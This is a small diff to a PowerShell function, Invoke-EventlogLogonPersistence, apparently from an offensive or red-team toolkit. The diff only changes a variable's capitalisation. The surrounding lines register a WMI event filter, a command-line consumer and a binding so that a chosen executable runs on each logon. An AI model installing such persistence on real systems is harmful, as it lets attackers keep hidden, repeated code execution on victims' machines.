@@ -25,6 +25,6 @@ function Invoke-EventlogLogonPersistence
 
     $Query = "Select * from __InstanceCreationEvent where TargetInstance ISA 'Win32_NTLogEvent' and TargetInstance.EventCode = '4624'" 
     $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$FilterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop 
-    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Argument @{Name=$ConsumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath} 
+    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Argument @{Name=$ConsumerName;ExecutablePath=$EXEPath;CommandLineTemplate=$EXEPath} 
     Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} 
 }
